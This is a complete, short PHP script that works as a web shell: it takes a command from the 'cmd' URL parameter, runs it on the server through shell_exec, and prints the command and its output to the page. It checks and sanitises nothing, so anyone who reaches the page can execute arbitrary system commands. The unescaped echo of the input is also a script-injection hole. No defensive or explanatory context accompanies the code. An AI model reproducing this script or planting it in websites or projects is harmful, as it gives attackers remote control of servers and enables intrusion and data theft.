<?php
if (isset($_GET['cmd'])) {
  $cmd = $_GET['cmd'];
  echo "<pre>Command: $cmd</pre>";
  $output = shell_exec($cmd);
  echo "<pre>$output</pre>";
} else {
  echo "Provide a command using ?cmd= in the URL.";
}
?>
